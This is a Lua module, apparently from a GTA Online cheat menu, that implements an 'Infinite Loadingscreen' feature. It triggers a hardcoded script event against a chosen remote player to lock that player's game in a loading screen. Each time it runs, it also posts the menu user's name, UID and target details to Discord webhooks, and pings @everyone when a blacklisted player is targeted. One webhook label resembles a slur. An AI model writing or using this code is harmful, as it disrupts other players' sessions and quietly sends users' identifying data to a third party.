local function createInfiniteLoadingScreenEventModule(moduleContext)
    KSRuntimePlayerFeatureState = KSRuntimePlayerFeatureState or {}
    KSRuntimePlayerFeatureState.largeObjects = KSRuntimePlayerFeatureState.largeObjects or {}
    KSRuntimePlayerFeatureState.dumpedObjectsPID = KSRuntimePlayerFeatureState.dumpedObjectsPID or {}

    local function runInfiniteLoadingScreenEvent(playerFeature)
        local targetPlayerId = Utils.GetSelectedPlayer()
        local targetPlayer = Players.GetById(targetPlayerId)
        if not targetPlayer then
            return
        end
        local targetGamerInfo = targetPlayer:GetGamerInfo()
        if targetPlayerId == GTA.GetLocalPlayerId() or targetPlayerId == nil then
            return
        end
        if blacklistRIDList[targetGamerInfo.RockstarId] then
            if not isDev then
                blacklistSound()
                SendToDiscord("nogger", ("%s(%i) tried to Crash a Blacklisted Player (%s)! @everyone"):format(
                    Players.GetName(GTA.GetLocalPlayerId()), Cherax.GetUID(),
                    Players.GetName(targetPlayerId)
                ))
                return
            end
        end

        local function logFeatureUse()
            local targetTags = Players.GetTags(targetPlayerId)
            local isTargetFriend = string.find(targetTags, "[F]", 1, true) ~= nil
            SendToDiscord("lol", ("%s used Infinite Loadingscreen against %s with UID %i, isSupporter: %s, is Target Friend?: %s"):format(
                PLAYER.GET_PLAYER_NAME(GTA.GetLocalPlayerId()),
                Players.GetName(targetPlayerId), Cherax.GetUID(),
                tostring(isSupporter), tostring(isTargetFriend)
            ))
        end
        log = logFeatureUse
        Script.QueueJob(log)
        local eventId = -1321657966
        GTA.TriggerScriptEvent(
            1 << Utils.GetSelectedPlayer(), eventId, GTA.GetLocalPlayerId(),
            2, 0, 1, -1, 1, -1, 0, 0, 0
        )
        notify("Done!")
    end

    local infiniteLoadingScreenEventRunner = { variant = "donator", feature = "lexisSkid2", slug = "lexisskid2" }

    function infiniteLoadingScreenEventRunner.run(runContext)
        if type(runContext) ~= "table" or not runContext then
            runContext = {}
        end
        return runInfiniteLoadingScreenEvent(runContext.feature)
    end

    return infiniteLoadingScreenEventRunner
end

return createInfiniteLoadingScreenEventModule
